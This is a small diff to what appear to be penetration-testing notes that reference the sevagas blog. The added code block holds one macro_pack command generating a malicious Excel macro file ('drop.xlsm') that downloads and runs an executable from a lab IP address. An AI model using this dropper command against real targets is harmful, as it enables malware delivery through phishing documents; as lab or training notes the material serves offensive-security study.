@@ -414,7 +414,9 @@ he also has a blog
 
 https://blog.sevagas.com/
 
-
+```
+echo "http://10.10.6.59:8099/concona.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER -G "drop.xlsm"
+```
 
 
 
